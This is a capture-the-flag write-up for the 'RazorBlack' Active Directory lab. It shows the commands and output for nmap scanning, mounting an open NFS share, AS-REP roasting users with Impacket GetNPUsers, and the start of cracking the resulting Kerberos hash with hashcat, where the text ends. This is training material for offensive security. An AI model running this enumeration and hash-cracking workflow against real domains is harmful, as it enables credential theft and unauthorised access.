# RazorBlack — Writeup

## Overview
### RazorBlack — Writeup
### RazorBlack — Writeup

## Enumeration
```text
RazorBlack
These guys call themselves hackers. Can you show them who's the boss ??

Throw something like a rock on the big green thingy on the right side here to deploy your box.

The box has ICMP enabled. So, look at ping first before starting recon and stop slapping `-Pn` on nmap.

This room is proudly made by: Xyan1d3

Every solver of this box will get a free cookie when completing this box.

If you enjoy this room, please let me know by tagging me on Twitter. You may also contact me in case of some unintended routes or bugs, and I will be happy to resolve them. Also, let me know which part you enjoyed and which part made you struggle.

This will test your Active Directory enumeration and exploitation knowledge.

Submit your flags and answers to prove your progression.

The following things are covered in this Write-up.

    Background
    Enumerate Domain Controller
    Exploiting Kerberos
    Administrator Privilege Escalation

What is the Domain Name?

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: :58Z)
111/tcp   open  rpcbind       syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
2049/tcp  open  mountd        syn-ack 1-3 (RPC #100005)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49672/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         syn-ack Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack Microsoft Windows RPC

389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
raz0rblack.thm

What is Steven's Flag?
Now we need to enumerate the Machine Further.
```
```text
# Port 111

We will start from here. Since that we have verified that an NFS service is running (2049/TCP open NFS), we can deepen and see what else we can obtain.

Este comando se puede usar en un servidor de NFS, para ver todos los hosts que tienen algún sistema de ficheros montado sobre el servidor. Con la opción -a se muestra tanto el host, como los directorios.
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ showmount --help
Usage: showmount [-adehv]
       [--all] [--directories] [--exports]
       [--no-headers] [--help] [--version] [host]
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ showmount -e 10.10.125.128             
Export list for 10.10.125.128:
/users (everyone)

/users folders can be accessed by anyone. Let's try to mount that
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ mkdir smb
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo mount -t nfs -o vers=2 10.10.125.128:/users ./smb 
mount.nfs: requested NFS version or transport protocol is not supported
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo mount -t nfs  10.10.125.128:/users ./smb 
s
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
1.pdf                     Market_Place
46635.py                  NAX
alice_key                 nikto
backdoors                 overpass2.pcapng
BinaryHeaven              overpass.go
buildscript.sh            PHishing
Chankro                   PRET
C_hooking                 priv.key
cracking.txt              PurgeIrrelevantData_1826.ps1
credential.pgp            responder_ntlm_hash
CustomerDetails.xlsx      reverse.exe
CustomerDetails.xlsx.gpg  reverse.msi
DDOS                      robert_ssh.txt
Devservice.exe            SAM
DNS_MANIPUL               shadow.txt
download.dat              SharpGPOAbuse
download.dat2             SharpGPOAbuse.exe
downloads                 shell.php
exploit                   smb
exploit_commerce.py       socat
Ghostcat-CNVD-2020-10487  solar_log4j
Git_Happens               starkiller-1.10.0.AppImage
hash                      startup.bat
hashes.txt                stats.db
hash.txt                  system.txt
hydra.rsa                 teaParty
ICS_plant                 tryhackme.asc
id_rsa                    user.png
id_rsa_robert             users.db
key                       walrus_and_the_carpenter.py
KIBA                      Windows_priv
Lian_Yu                   Witty
linpeas.sh                WittyAle.ovpn
malicioso.png             WordPress_CVE202129447
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ cd smb        
cd: permission denied: smb
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
1.pdf                     Market_Place
46635.py                  NAX
alice_key                 nikto
backdoors                 overpass2.pcapng
BinaryHeaven              overpass.go
buildscript.sh            PHishing
Chankro                   PRET
C_hooking                 priv.key
cracking.txt              PurgeIrrelevantData_1826.ps1
credential.pgp            responder_ntlm_hash
CustomerDetails.xlsx      reverse.exe
CustomerDetails.xlsx.gpg  reverse.msi
DDOS                      robert_ssh.txt
Devservice.exe            SAM
DNS_MANIPUL               shadow.txt
download.dat              SharpGPOAbuse
download.dat2             SharpGPOAbuse.exe
downloads                 shell.php
exploit                   smb
exploit_commerce.py       socat
Ghostcat-CNVD-2020-10487  solar_log4j
Git_Happens               starkiller-1.10.0.AppImage
hash                      startup.bat
hashes.txt                stats.db
hash.txt                  system.txt
hydra.rsa                 teaParty
ICS_plant                 tryhackme.asc
id_rsa                    user.png
id_rsa_robert             users.db
key                       walrus_and_the_carpenter.py
KIBA                      Windows_priv
Lian_Yu                   Witty
linpeas.sh                WittyAle.ovpn
malicioso.png             WordPress_CVE202129447
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ cd smb
cd: permission denied: smb
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo kali                                    
sudo: kali: command not found
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo su  
┌──(root㉿kali)-[/home/kali/Downloads]
└─# cd smb                 
                                                                                
┌──(root㉿kali)-[/home/kali/Downloads/smb]
└─# ls
employee_status.xlsx  sbradley.txt

┌──(root㉿kali)-[/home/kali/Downloads/smb]
└─# su kali
```
```text
┌──(kali㉿kali)-[~/Downloads/smb]
└─$ ls
ls: cannot open directory '.': Permission denied
```
```text
┌──(kali㉿kali)-[~/Downloads/smb]
└─$ sudo su                   
[sudo] password for kali: 
┌──(root㉿kali)-[/home/kali/Downloads/smb]
└─# cat sbradley.txt  
��THM{ab53e05c9a98def00314a14ccbfa8104}

there is another file employee_status.xlsx let’s read the content of this file. in my case I used MS office, you can use any office application. Extracted usernames from the xlsx file:

content

daven port
imogen royce
tamara vidal
arthur edwards
carl ingram
nolan cassidy
reza zaydan
ljudmila vetrova
rico delgado
tyson williams
steven bradley
chamber lin

What is the zip file's password?

We will make a modified users file according to the naming convention used
steven Bradley -> sbradely

dport
iroyce
tvidal
aedwards
cingram
ncassidy
rzaydan
lvetrova
rdelgado
twilliams
sbradley
clin

Now we have a user list so let's try it against Kerberos. We will use IMPACKET’s GetNPUsers to brute force Kerebos and the Hash of an existing user from our User List.

Add the machine IP address to the /etc/hosts file to continue this attack, Otherwise, you will not be able to use the Tool
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.113.254   magician
10.10.121.237   git.git-and-crumpets.thm
10.10.149.10    hipflasks.thm hipper.hipflasks.thm
10.10.18.221    raz0rblack raz0rblack.thm
```
```text
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

## Exploitation
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py 'raz0rblack.thm/' -usersfile user.lst -no-pass -dc-ip 10.10.18.221 -format hashcat -outputfile hashes.asreproast              
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```
```text
# getting the hash
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ cat hashes.asreproast 
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:65722ab4e4a9981448677554d3e4c0f4$70406f0d7057f97bd8c02f51e5899961a43046c460dc9170848067e6558c7f6c9e23767d844036b2be0759c36193965d022ea59923d0a199d2bda1a93f882800ee6d724170f31f1e33d3f5b87bbf72c6de9a4b9375c9073538124662bcc2232223ee5faf88ceb6c6ef2478127826a4df6daca9b6b2936d5d8f7694929c8cafe3f83833291bc033d5456f7981805e6ae9147de848a99f437433344c7e39ba6b0c89b3f7d923bd04550df9624dcdb7c3ba33c24e2534331713c26bb98ecd761919b28a6f5e10940dc7e37107ac139f042f659162ca27d63204155a1df6fc167e6adfdade985bfb0bf529d4b802109ef878

#bruteforce
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 1243/2550 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

